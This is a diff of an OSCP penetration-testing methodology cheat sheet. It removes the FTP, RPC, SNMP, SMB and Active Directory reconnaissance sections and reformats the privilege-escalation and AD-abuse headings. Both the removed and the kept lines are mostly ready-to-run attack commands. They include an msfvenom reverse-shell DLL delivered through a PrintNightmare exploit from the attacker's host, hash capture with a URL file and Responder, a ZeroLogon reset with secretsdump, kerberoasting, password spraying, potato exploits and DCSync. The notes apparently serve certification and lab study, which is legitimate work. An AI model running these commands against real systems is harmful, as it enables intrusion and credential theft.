@@ -1,305 +1,10 @@
-# OSCP & Methodology
-
-_The following sequence should be followed accordingly if applicable to conduct an oragnaized penetration test to avoid rabbit holes for the OSCP._
-
-## Pre-Foothold Testing
-
-### Verify All Open TCP Ports
-
-```
-rustscan --accessible -u 5000 -b 2500 -a $ip  -- -Pn -A
-```
-
-### FTP Testing
-
-#### Anonymous Access
-
-Check for anonymous login guest, ftp, anonymous, anonymous@anonymous.com
-
-```
-ftp $ip
-```
-
-#### File Download
-
-Type "passive" if needed to remove passive mode to be able to continue to access ftp. type "binary" first then get to download files
-
-```
-ftp> passive
-ftp> binary
-```
-
-Rescursively download files via ftp
-
-```
-wget -r ftp://user:pass@ip/
-```
-
-If you find password-protected zip files use zip2john followed by john the hash\*
-
-```
-zip2john file.zip >> hashes.txt
-john hashes.txt
-```
-
-#### Test For File Upload RCE
-
-If ftp allows uploading of files and the webserver has an local file inclusion vulnerability you can upload a php shell and call the file from the webserver to gain a reverse shell maybe it’ll have functionality that auto-executes uploaded files periodically.
-
-#### ProFTPd 1.3.5 - 'mod\_copy' Remote Command Execution
-
-#### Meta Data
-
-Extract meta data and may contain email addresses\*
-
-```
-exiftool file
-```
-
-### RPC Testing
-
-#### Test For PrintNightmare
-
-```
-rpcdump.py @$ip | egrep 'MS-RPRN|MS-PAR'
-```
-
-If the output is the following contains the following, it is vulnerable.
-
-```
-Print System Aschronous Remote Protocol
-Print System Remote Protocol
-```
-
-```
-msfvenom -p windows/x64/shell_reverse_tcp lhost=$tun0 lport=53 -f dll -o /opt/winreconpack/thescriptkid.dll
-```
-
-```
-python3 printnightmare.py domain.local/user:password@$ip '\\$tun0\winreconpack\thescriptkid.dll'
-```
-
-### SNMP Testing
-
-#### Scan SNMP
-
-```
-snmpwalk -v 2c -c public $ip 1.3.6.1.2.1.1.5.0
-```
-
-#### Brute force SNMP secret string
-
-```
-onesixtyone -c /usr/share/wordlists/seclists/Discovery/SNMP/snmp.txt $ip
-```
-
-Brute force SNMP secret string
-
-### SMB Testing
-
-#### Search SMB Known Version Vulnerabilities
-
-#### Check For Shares Using Null Sessions
-
-```
-smbclient -N -L //$ip/
-```
-
-```
-cme smb $ip --shares -u "guest" -p ""
-```
-
-#### Test for URL File attacks
-
-Test for URL File attacks by creating a file called "@somename.url" with the following contents, upload, spin up smbserver to capture hash
-
-```
-[InternetShortcut]
-URL=blah
-WorkingDirectory=blah
-IconFile=\\EnterAttackerip\%USERNAME%.icon
-IconIndex=1
-```
-
-Run Responder to capture hashes
-
-```
-/opt/Responder-3.1.3.0/Responder.py -I tun0
-```
-
-#### Test for read / upload access
-
-Attempt to download and view share contents using valid credential / anonymous login / null session
-
-```
-smbmap -u guest -p "" -H $ip -A '.*' -R
-```
-
-#### Cpassword discovery
-
-Search "Groups.xml" for cpassword decryption using
-
-```
-gpp-decrypt cpassword
-```
-
-#### lsass.zip lsass.dmp
-
-search lsass.zip or lsass.dmp to use to dump credentials / keys / tickets
-
-```
-pypykatz lsa minidump "lsass.zip"
-```
-
-#### Alternate Data Streams (ADS)
-
-Test for alternate data streams after discovering 0 byte files
-
-```
-allinfo filename
-```
-
-#### Check Password Policy
-
-```
-cme smb $ip --pass-pol -u guest -p ""
-```
-
-#### User Discovery
-
-Check For users using valid credential / anonymous login / null session
-
-```
-cme smb $ip --users -u guest -p ""
-```
-
-```
-cme smb $ip --rid-brute -u guest -p ""
-```
-
-#### Group discovery
-
-check for groups using valid credential / anonymous login / null session
-
-```
-cme smb $ip --groups -u guest -p ""
-```
-
-#### Smbclient
-
-Interactively access the smb shares using smbclient
-
-```
-smbclient //$ip/someshare -N
-smbclient //$ip/someshare -U 'guest' -N
-smbclient //$ip/someshare -U 'validuser' -p 'validpass'
-```
-
-### Active Directory Testing (No Creds)
-
-#### Test for information disclosure
-
-Dump All ( Null Authentication )
-
-```
-ldapsearch -v -H 'ldap://$ip' -x -D '' -w '' -b 'DC=domain,DC=local'
-```
-
-Dump All ( Anonymous Authentication )
-
-```
-ldapsearch -v -H 'ldap://$ip' -x -b 'DC=domain,DC=local'
-```
-
-Automated query
-
-```
-ldapenum -d $domain -u "" -p ""
-```
-
-```
-ldapenum -d $domain
-```
-
-#### Test for zeroLogon
-
-```
-python3 /opt/set_empty_pw.py dc-name $ip
-```
-
-```
-secretsdump.py -just-dc $domain/dc-name\$@$ip
-```
-
-#### Enumerate Users
-
-Compile usernames 
-
-```
-/opt/username-anarchy/username-anarchy --input-file ./test-names.txt
-```
-
-find valid users
-
-```
-kerbrute userenum /usr/share/wordlists/seclists/Usernames/Names/names.txt -d $domain --dc $ip
-```
-
-### Active Directory Testing (Only User)
-
-#### Test for UF DONT REQUIRE PREAUTH
-
-```
-GetNPUsers.py $domain/ -no-pass -usersfile /usr/share/seclists/Usernames/Names/names.txt -dc-ip $ip
-```
-
-### Active Directory Testing (With Creds)
-
-#### Bloodhound Hunting
-
-```
-bloodhound-python -u username -p password  -d $domain -ns $ip -c all
-```
-
-```
-neo4j start
-```
-
-```
-/opt/bloodhound/BloodHound-linux-x64/BloodHound --no-sandbox 2>1 /dev/null &
-```
-
-
-#### ASReproast
-
-```
-python3 /usr/local/bin/GetUserSPNs.py domain.com/user:password -dc-ip $ip -request
-```
-
-```
-hashcat -d 2 krb5tgs.txt -m 13100 -a 0 /usr/share/wordlists/rockyou.txt
-```
-
-#### Test for information disclosure
-
-```
-ldapsearch -v -H 'ldap://$ip' -x -D 'USER@DOMAIN.LOCAL' -w 'PASSWORD' -b 'DC=domain,DC=local'
-```
-
-#### Password Spraying
-
-Kerbrute
-
-```
-kerbrute passwordspray -d domain.com --dc $ip users.txt
-```
-
-CrackMapExec
-
-```
-cme smb $ip -u users.txt -p 'password'
-```
-
+---
+description: >-
+  The following sequence should be followed accordingly if applicable to conduct
+  an organized penetration test to avoid rabbit holes for the OSCP.
+---
+
+# OSCP Methodology & Notes
 
 ### Web Application Testing
 
@@ -499,7 +204,7 @@ secretsdump.py domain.local/user:password@$ip
 
 #### SeImpersonatePrivilege OR SeAssignPrimaryToken
 
-##### RoguePotato
+**RoguePotato**
 
 If the machine is >= Windows 10 1809 & Windows Server 2019
 
@@ -513,7 +218,7 @@ Transfer a malicious binary or nc.exe before running the following command
 RoguePotato.exe -r Kali-ip -e "C:\full\path\to\malicious.exe" -l 9999
 ```
 
-##### JuicyPotato
+**JuicyPotato**
 
 If the machine is < Windows 10 1809 < Windows Server 2019\*
 
@@ -521,13 +226,13 @@ If the machine is < Windows 10 1809 < Windows Server 2019\*
 juicypotato.exe -l 1337 -p c:\full\path\to\malicious.exe -t * -c {F87B28F1-DA9A-4F35-8EC0-800EFCF26B83} OR {4991d34b-80a1-4291-83b6-3328366b9097}
 ```
 
-##### PrintSpoofer
+**PrintSpoofer**
 
 ```
 printspoofer.exe -c "C:\full\path\to\malicious.exe" -i
 ```
 
-##### HotPotato
+**HotPotato**
 
 Windows 7, 8, 10, Server 2008, and Server 2012
 
@@ -910,9 +615,7 @@ Find-InterestingDomainAcl -ResolveGUIDs | where-object {$_.identityreferencename
 Find-InterestingDomainAcl -ResolveGUIDs | where-object {$_.ActiveDirectoryRights -like "*GenericAll*"} | Where-Object {$_.identityreferenceclass -ne "computer"}
 ```
 
-
-
-##### Write DACL
+**Write DACL**
 
 ```
 $SecPassword = ConvertTo-SecureString 'CompromisedUserPass' -AsPlainText -Force
@@ -927,7 +630,7 @@ Add-ObjectACL -PrincipalIdentity compromiseduser -Credential $cred -Rights DCSyn
 secretsdumps.py $domain/user@$ip
 ```
 
-##### GetChangesAll (DCSync)
+**GetChangesAll (DCSync)**
 
 ```
 secretsdump.py domain/user@ip
@@ -935,9 +638,9 @@ secretsdump.py domain/user@ip
 
 Or use Mimikatz
 
-##### ReadGMSApassword
+**ReadGMSApassword**
 
-Remotely. *may need to use ntpdate $domain if you get clockscrew error*
+Remotely. _may need to use ntpdate $domain if you get clockscrew error_
 
 ```
 python2 /opt/gMSADumper/gMSADumper.py -d $domain -u CompromisedUser -p Password
@@ -949,7 +652,7 @@ Locally with EXE
 .\GMSAPasswordReader.exe --AccountName 'ReadGMSApassword_Rights_To_User'
 ```
 
-##### ForceChangePassword
+**ForceChangePassword**
 
 ```
 $CompromisedUserName = 'CompromisedUserName'
@@ -971,7 +674,7 @@ $LateralEscUserPass = ConvertTo-SecureString 'LateralEscUserPass' -AsPlainText -
 Set-DomainUserPassword -Identity LateralEscUserName -AccountPassword $LateralEscUserPass -Credential $Cred
 ```
 
-##### GenericAll
+**GenericAll**
 
 ```
 $CompromisedUserName = 'CompromisedUserName'
@@ -989,7 +692,7 @@ $Cred = New-Object System.Management.Automation.PSCredential $CompromisedUserNam
 Invoke-Command -computername 127.0.0.1 -ScriptBlock {Set-ADAccountPassword -Identity LateralEscUserName -reset -NewPassword (ConvertTo-SecureString -AsPlainText 'password' -force)} -Credential $cred
 ```
 
-##### GenericWrite
+**GenericWrite**
 
 Use this for reverseshell using scriptpath=, enumeration, or use serviceprincipalname= for kerberoast
 
@@ -1019,8 +722,7 @@ OR
 Set-DomainObject -Credential $Cred -Identity LateralEscUserName -SET @{scriptpath='C:\\path\\to\\script.ps1'}
 ```
 
-
-##### WriteOwner
+**WriteOwner**
 
 ```ps1
 $CompromisedUserName = 'CompromisedUserName'
